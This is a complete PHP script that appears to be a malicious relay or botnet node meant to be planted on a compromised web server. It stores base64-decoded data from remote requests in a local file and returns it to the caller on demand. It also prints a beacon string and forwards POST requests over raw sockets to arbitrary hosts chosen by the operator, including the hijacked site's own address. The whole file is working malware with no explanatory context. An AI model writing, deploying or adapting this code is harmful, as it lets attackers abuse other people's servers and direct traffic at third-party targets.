<?php 
ignore_user_abort(true);
set_time_limit(0);



if (isset($_REQUEST['gl'])){
$good=base64_decode($_REQUEST['gl']);
file_put_contents('good.txt',$good."\n",FILE_APPEND);
exit;} 


 
function curl_request_async($url, $params, $type='POST')
{

foreach ($params as $key => &$val) {
if (is_array($val)) $val = implode(',', $val);
$post_params[] = $key.'='.urlencode($val);}
$post_string = implode('&', $post_params);
$parts=parse_url($url);
$fp = fsockopen($parts['host'],
isset($parts['port'])?$parts['port']:80,
$errno, $errstr, 30);
if('GET' == $type) $parts['path'] .= '?'.$post_string;
      $out = "$type ".$parts['path']." HTTP/1.1\r\n";
      $out.= "Host: ".$parts['host']."\r\n";
      $out.= "Content-Type: application/x-www-form-urlencoded\r\n";
      $out.= "Content-Length: ".strlen($post_string)."\r\n";
      $out.= "Connection: Close\r\n\r\n";
      // Data goes in the request body for a POST request
      if ('POST' == $type && isset($post_string)) $out.= $post_string;
fwrite($fp, $out);
fclose($fp);
}


function curl_async($url, $params, $type='POST')
{
$post_string = $params;
$parts=parse_url($url);
$fp = fsockopen($parts['host'],
isset($parts['port'])?$parts['port']:80,
$errno, $errstr, 30);
if('GET' == $type) $parts['path'] .= '?'.$post_string;
      $out = "$type ".$parts['path']." HTTP/1.1\r\n";
      $out.= "Host: ".$parts['host']."\r\n";
      $out.= "Content-Type: application/x-www-form-urlencoded\r\n";
      $out.= "Content-Length: ".strlen($post_string)."\r\n";
      $out.= "Connection: Close\r\n\r\n";
      // Data goes in the request body for a POST request
      if ('POST' == $type && isset($post_string)) $out.= $post_string;
fwrite($fp, $out);
fclose($fp);
}

function resends($arurl)
{
foreach ($arurl as $urlsnd=>$urlthr) { 
$pst['urls']=$urlthr;
if (isset($_REQUEST['gdd'])) {$gdd=$_REQUEST['gdd'];} else {$gdd=base64_encode($_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']);}
$pst['urlg']=$gdd;
curl_request_async($urlsnd,$pst,'POST');}
}


function multiwork($data)
{
foreach ($data as $urlsnd=>$urlthr) { 
curl_async($urlsnd,$urlthr,'POST');}
}




ob_end_clean();
header("Connection: close");
ob_start();
if (file_exists('good.txt')){echo File_get_contents('good.txt');file_put_contents('good.txt', '');}
echo "\n<work_fine_ok>\n";
$size = ob_get_length();
header("Content-Length: $size");
ob_end_flush();
flush();

if (isset($_REQUEST['murl'])){
resends($_REQUEST['murl']);
}

if (isset($_REQUEST['mres'])){
multiwork($_REQUEST['mres']);
}



?>